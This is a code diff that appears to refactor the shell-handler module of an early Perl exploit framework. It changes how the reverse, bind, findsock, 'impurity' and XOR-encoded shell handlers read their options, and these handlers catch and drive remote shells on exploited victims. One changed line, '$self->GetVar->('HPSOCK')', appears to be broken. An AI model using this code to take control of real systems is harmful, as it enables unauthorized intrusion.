@@ -69,7 +69,7 @@ sub reverse_shell
     
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
-                LocalPort => $opt->{"LPORT"},
+                LocalPort => $self->GetVar('LPORT'),
                 Type => SOCK_STREAM,
                 ReuseAddr => 1,
                 Listen => 3
@@ -110,7 +110,7 @@ sub reverse_shell
             print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
             my $console = $self->ConsoleStart();
-            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
+            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
             $callback->("CONNECT", $victim);
 
             $self->DataPump($console, $victim, $callback);
@@ -158,8 +158,8 @@ sub bind_shell
     {
        $victim = IO::Socket::INET->new (
                     Proto => "tcp",
-                    PeerAddr => $opt->{"RHOST"},
-                    PeerPort => $opt->{"LPORT"},
+                    PeerAddr => $self->GetVar('RHOST'),
+                    PeerPort => $self->GetVar('LPORT'),
                     Type => SOCK_STREAM,
        );
 
@@ -177,7 +177,7 @@ sub bind_shell
                     print STDERR "[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
                     my $console = $self->ConsoleStart();
-                    my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
+                    my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
                     $callback->("CONNECT", $victim);
                     $self->DataPump($console, $victim, $callback);
                     $self->ConsoleStop($console);
@@ -212,7 +212,7 @@ sub impurity_reverse
 
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
-                LocalPort => $opt->{"LPORT"},
+                LocalPort => $self->GetVar('LPORT'),
                 Type => SOCK_STREAM,
                 ReuseAddr => 1,
                 Listen => 3
@@ -249,7 +249,7 @@ sub impurity_reverse
 
             print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n";
            
-            if(! open(X, "<".$opt->{'PEXEC'}))
+            if(! open(X, "<".$self->GetVar('PEXEC')))
             {
                 print STDERR "ERROR\n";
                 print "[*] Could not open payload executable file: $!\n";
@@ -282,7 +282,7 @@ sub impurity_reverse
             print STDERR "[*] Switching to impurity payload\n\n";
 
             my $console = $self->ConsoleStart();
-            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
+            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
             $callback->("CONNECT", $victim);
             $self->DataPump($console, $victim, $callback);
             $self->ConsoleStop($console);
@@ -307,7 +307,7 @@ sub impurity_reverse
 sub findsock_shell
 {
     my ($self, $pay, $opt, $exploit) = @_;
-    my $s = $opt->{'HCSOCK'};
+    my $s = $self->GetVar('HCSOCK');
     Pex::Unblock($s);
 
     my $stopserver = 0;
@@ -341,7 +341,7 @@ sub findsock_shell
             
             # attach the exploit to the console
             my $console = $self->ConsoleStart();
-            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
+            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
             $callback->("CONNECT", $s);
             $self->DataPump($console, $s, $callback);
             $self->ConsoleStop($console);
@@ -367,7 +367,7 @@ sub findsock_shell_exp
     print STDERR "[*] Debug: opt = $opt (" . join(" ", keys(%{$opt})) . "\n";
     
     # this is our socket to the parent
-    my $s = $opt->{'HPSOCK'};
+    my $s = $self->GetVar->('HPSOCK');
     Pex::Unblock($s);
     
     # this is our socket to the exploited service
@@ -401,7 +401,7 @@ sub reverse_shell_xor
     
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
-                LocalPort => $opt->{"LPORT"},
+                LocalPort => $self->GetVar('LPORT'),
                 Type => SOCK_STREAM,
                 ReuseAddr => 1,
                 Listen => 3
@@ -416,7 +416,7 @@ sub reverse_shell_xor
     # put server into non-blocking mode
     Pex::Unblock($s);
     
-    my $xor_key = $opt->{'XKEY'};
+    my $xor_key = $self->GetVar('XKEY');
     my $stopserver = 0;
     
     my %OSIG;
@@ -439,11 +439,12 @@ sub reverse_shell_xor
             
             # terminate the exploit process
             kill(9, $exploit);
-
-            print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
+            
+            $self->PrintLine("[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...");
+            $self->PrintLine("");
 
             my $console = $self->ConsoleStart();
-            my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
+            my $callback = defined($self->GetVar('HCALLBACK')) ? $self->GetVar('HCALLBACK') : sub {};
             $callback->("CONNECT", $victim);
 
             $self->DataPumpXor($console, $victim, $callback, $xor_key);
